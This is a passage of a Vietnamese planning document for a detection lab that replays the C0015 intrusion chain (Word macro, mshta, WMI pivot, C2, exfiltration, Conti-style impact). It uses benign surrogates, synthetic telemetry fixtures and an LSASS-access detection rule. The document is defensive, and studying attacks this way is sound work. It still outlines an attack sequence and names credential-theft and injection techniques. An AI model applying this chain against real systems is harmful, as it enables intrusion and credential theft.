| **M-0** | **Offline foundation — LÀM TRONG NHIỆM VỤ NÀY** | repo | Viết run-ledger schema, lab_tools (artifact/manifest/receipt/scorecard), c2sim_v2 (task allowlist + receipt), fixtures synthetic, tests | `evidence/run-ledger/*`, `scripts/lab_tools.py`, `scripts/c2sim_v2.py`, `scripts/fixtures/*`, `scripts/tests/test_offline.py` | **`python scripts/tests/test_offline.py` xanh**; fixture đều `synthetic:true`; schema cấm secret |
| **M-1** | **Lát đầu tiên chạy lab: env verify + S1–S2 re-run** | Truy cập VM + user duyệt run | (1) Env verify read-only: **Word install state (gate S1)**, wmic presence + **xác nhận đường WMI credential tường minh (runas it.admin / Invoke-CimMethod -Credential) hoạt động — KHÔNG dùng token hiện tại**, **it.admin local admin trên FS01 (gate S8)**, audit policy (S4688/4778/4779), `winlog.logon.id` mapping, Sysmon version/config state + **pull `C:\Tools\sysmon-c0015.xml` từ WS01 để hash-reconcile với repo + quyết định deploy EID 7 scoped (điều kiện S2/S9)** + loopback S5145 + clock Kali→DC01 + DC01 OS/FS01 NAT/Kali IP; (2) re-run S1–S2 với run_id + ledger; (3) giải quyết hop mshta bằng raw E1 | `RUN-<id>` ledger (S1–S2) + env-verify checklist | E1 chain + **E7 hash (sau khi EID 7 scoped deploy)** + run_id ghi đủ; hop mshta resolved hoặc `UNRESOLVED` có lý do |
| M-2 | S3 session 1 | C2-SIM v2 (M-0) + agent benign | Deploy C2-SIM trên host lab; agent do bootstrap spawn; register/task loop | `session1` + receipt S1 | Receipt + ≥1 cycle + run_id |
| M-3 | S4–S6 discovery→decision | session1 | Lệnh DFIR → ART-04-01 → orchestrator → ART-04-02 | `art04_01/02` | Target suy ra từ artifact (log reason); C1 DETECTED |
| M-4 | S7–S9 auth→WMI→session 2 | art04_02 + credential handle | Controls ×3 → tool handoff C$ → wmic/CIM → register session2 | `art05_01`, `art06_01`, `ART-07-01` | 4-gate + receipt; KHÔNG marker-only |
| M-5 | S10–S11a collection→transfer r1 | session2 | Read corpus → manifest → POST sink | `art08_01`, `art09_01[r1]` | Hash chéo khớp; sender+receiver evidence |
| M-6 | S12 RDP | sau S11a | RDP session → DET-008 | `art10_01` | DET-008 defined + evidence |
| M-7 | S11b transfer r2 | art08_01 | POST lần 2 | `art09_01[r2]` | 2 receipt cùng run |
| M-8 | S13/S13b precursor | fixtures | Install tùy chọn + phân tích E10 | note | Không dữ liệu nhạy cảm |
| M-9 | S14 impact + restore | art12_01 + simulator (code sau) | Transform + restore verify | `art13_01/14_01` | Không exit corpus; restore khớp |
| M-10 | S15 E2E ×2 | tất cả | Engineering + investigation runs | `art15_01` | Scorecard; ledger ẩn trong investigation run |

**Rollback chuẩn mỗi stage:** xóa artifact/state của stage đó + đảo action trên VM (xóa file drop, kill process,
revoke credential handle, restore corpus) — ghi vào ledger field `rollback_status`.

## 6. Tool decisions (USE / SAFE SURROGATE / REPLAY ONLY / NOT USED)

| Tool/tech | Quyết định | Lý do |
|---|---|---|
| Word macro, mshta, regsvr32, rundll32, cmd/net/nltest/tasklist/ping, RDP | **USE** (native, benign) | Mechanism lịch sử, payload thay bằng benign |
| wmic | **USE** nếu build có; fallback **SAFE SURROGATE** (PowerShell `Invoke-CimMethod`) | wmic bị gỡ trên 24H2+; telemetry khác → ghi PARTIAL |
| Bazar, Cobalt Strike (beacon/C2), Rclone | **SAFE SURROGATE** (C2-SIM v2; HTTP POST sink) | Không malware/C2 thật, không MEGA |
| Conti | **SAFE SURROGATE** (simulator bounded, corpus-only) | Không ransomware thật |
| AdFind | **NOT USED** | DFIR chỉ ghi file write, không execution; không cần cho chain |
| AnyDesk | **NOT USED** (relay public) — tùy chọn install portable vào path bất thường để lấy telemetry path | Không hạ tầng công khai |
| Process Hacker / Mimikatz / LSASS access | **REPLAY ONLY** (fixtures E10) — nhánh detection-design | `[SUPPLEMENTAL-LAB-TECHNIQUE]`; không chạy tool, không lệnh trích xuất |
| Injection (D8B3→Winlogon, 143→svchost) | **REPLAY ONLY / ANALYSIS** (toy `lab-target.exe` nếu duyệt) | Không inject process hệ thống; không code injection |
| C2 framework OSS (Sliver/Mythic/…) | **NOT USED** | Ranh giới dự án |

## 7. Credential/auth stage (bắt buộc) + nhánh Mimikatz/LSASS

**Auth context per-run (S7):** mỗi run sinh **credential handle** mới cho account pre-provisioned (`it.admin`,
quyền giới hạn trên FS01, không DA). Handle chỉ nằm ở operator secrets manager (ngoài repo); ledger/artifact/log
chỉ chứa `account_name` + `sid` + `handle_ref` (placeholder). `[SUPPLEMENTAL-LAB-TECHNIQUE]` — provenance lịch sử
vẫn `[UNKNOWN-C0015]`; **không dùng credential tĩnh mặc định**. Verification identity: S4624/4672 LogonId ↔ SID
của handle được chọn; `lab_tools.py artifact-check` từ chối artifact chứa key `password/secret/token` (chỉ cho
phép `session_token` format lab).

**Nhánh Mimikatz/LSASS (`[SUPPLEMENTAL-LAB-TECHNIQUE]`, user-managed, T1003.001 — KHÔNG có trong 34/Tidal, không
phải hành vi lịch sử C0015):**
- **Chỉ thiết kế detection**, không lệnh/code/runbook trích xuất, không chạy tool, không dùng credential lấy được
  cho WMI.
- Mục tiêu detection: phát hiện **attempt** truy cập LSASS (E10 ProcessAccess `TargetImage=lsass.exe` từ process
  không phải system-expected; E11 drop tool; E1 child suspicious).
- Evidence cần thu: E10 (source/target ProcessGuid), E11 (path tool), E1 (ancestry), S4656/4663 (nếu audit).
- Correlation: `C-LSASS` — E10(lsass) ← same ProcessGuid → E11/E1 trong window 10 phút; control: E10 từ process
  hợp lệ (csrss/system) không fire.
- Tiêu chí đánh giá: rule fire trên fixture synthetic `e10_lsass_probe.json`; không fire trên fixture control;
  validation = **replay only**. DFIR đặt Process Hacker/LSASS ở ngày 5 và **không chứng minh** nó là nguồn
  credential WMI pivot sớm hơn — giữ đúng thứ tự: nhánh này chỉ nằm ở S13b, sau cả hai lượt transfer.

## 8. Components đã implement trong repo (M-0)

| Component | File | Chức năng | Test |
|---|---|---|---|
| Run-ledger schema + template | `evidence/run-ledger/RUN-schema.json`, `RUN-template.json`, `scorecard-template.json` | Envelope chuẩn (run_id, stages, artifacts, evidence_refs, rollback_status); **cấm key secret** | test schema-load + cấm secret key |
| Artifact/hash validation | `scripts/lab_tools.py` (subcommand `artifact-new/artifact-check/manifest-new/receipt-check/score/fixture-check`) | Tạo + kiểm artifact envelope, manifest SHA-256/bytes, cross-check manifest↔receipt↔allowlist (C4 offline), scorecard (ART-15-01), kiểm fixtures + điều kiện C1 | unittest offline |
| C2-SIM v2 (task allowlist) | `scripts/c2sim_v2.py` | Endpoint `/dl`, `/session/register`, `/task/next`, `/result`, `/checkin`; **task allowlist cố định** (`T-DISCOVER-CORPUS`, `T-BEACON-SLEEP`, `T-NOOP`), stage/host/token validation, sinh `ART-07-01` receipt server-side; logic thuần tách rời (test không cần mạng) | unittest logic |
| Receipt validation | `scripts/lab_tools.py receipt-check` + allowlist file | Hash trong allowlist, bytes ≤ cap, khớp manifest | unittest pass/fail |
| Telemetry fixtures/replay | `scripts/fixtures/*.json` + `README.md` | Fixtures **synthetic** (E1/E7/E11/E3/S4624/S4648/S4625/S5145/E10) cho correlation tests + replay; E3 fixture có ProcessGuid null (mô phỏng gap đã gặp) | fixture-check + C1 condition test |
| Correlation tests | `scripts/tests/test_offline.py` | Kiểm điều kiện C1 (≥4 families, ≥1 collection, ≥2 hosts) trên fixture; downgrade trigger (ProcessGuid null) | unittest |
| Scorecard | `scripts/lab_tools.py score` + template | So sánh reconstruction vs ground-truth ledger; verdict per stage (FOUND/LINKED/MISSING) | unittest |

Chạy: `python scripts/tests/test_offline.py` (Python 3.12 đã xác nhận). C2-SIM: `python scripts/c2sim_v2.py --port
8080 --ledger evidence/run-ledger --ip 192.168.50.1` — **chỉ chạy khi user duyệt, trên host lab**.

## 9. Known unknowns & telemetry gaps

- **C0015:** credential provenance WMI pivot `[UNKNOWN-C0015]`; cơ chế đưa 143.dll lên target trước rundll32
  `[UNKNOWN-C0015]` (lab: C$ copy supplemental); command line/export chính xác của 143.dll; nội dung batch Conti;
  credential RDP có trùng WMI không; D574 vì sao không kết nối; D8B3→Winlogon chi tiết mechanism.
- **Lab:** VM IP/config hiện tại; Sysmon working-tree config đã deploy chưa; parity rule Elastic↔repo; wmic
  presence; loopback S5145; Kali clock skew; claims post-09-19 `[NOT-VERIFIED-IN-REPO]`; Phase 1 PID/entity
  conflict `UNRESOLVED`.
- **Telemetry gaps đã ghi:** E3 không attribution (P1-B) + E3 thiếu (P1-C); E1 không tự chứng minh macro; E19–21
  không liên quan remote process creation; EID 3 ≠ RPC.

## 10. Quy tắc repo

Không commit/push/deploy; không đụng `configs/sysmon/sysmon-c0015.xml` + detection files; không sửa
`docs/lab-journal.md`, `docs/lessons-learned.md`; không ghi secret; secret scan trước commit tương lai.